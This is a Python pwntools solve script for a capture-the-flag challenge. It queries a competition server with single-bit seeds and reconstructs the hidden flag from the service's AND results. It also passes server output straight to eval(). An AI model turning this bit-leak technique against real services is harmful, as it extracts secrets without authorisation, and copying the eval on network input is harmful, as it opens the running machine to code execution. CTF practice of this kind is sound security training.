#!/usr/bin/env python
#!CMD: ./solve.py

from pwn import *

def generate(seeds, idx):
    p.sendline(b"1")
    p.sendline(b"2")  # Index
    p.sendline(str(len(seeds)).encode())

    for seed in seeds:
        p.sendline(str(seed).encode())

    p.recvuntil(b"Result: ")
    result = p.recvuntil(b"\n").decode().strip()
    result = eval(result)

    return result


def extract_flag():
    # generate seeds to isolate each bit position
    seeds = [(1 << i) for i in range(520)] 
    
    results = generate(seeds, idx=2)
    # print(results)
   
    flag_int = 0
    for i, result in enumerate(results):
        if result != 0:  # If the AND operation returned a non-zero value, the bit is 1
            flag_int |= (1 << i)

   
    flag_bytes = flag_int.to_bytes((flag_int.bit_length() + 7) // 8, "big")
    return flag_bytes.decode()



p = remote("mindblowing.challs.pascalctf.it", 420)
print(extract_flag())
p.close()

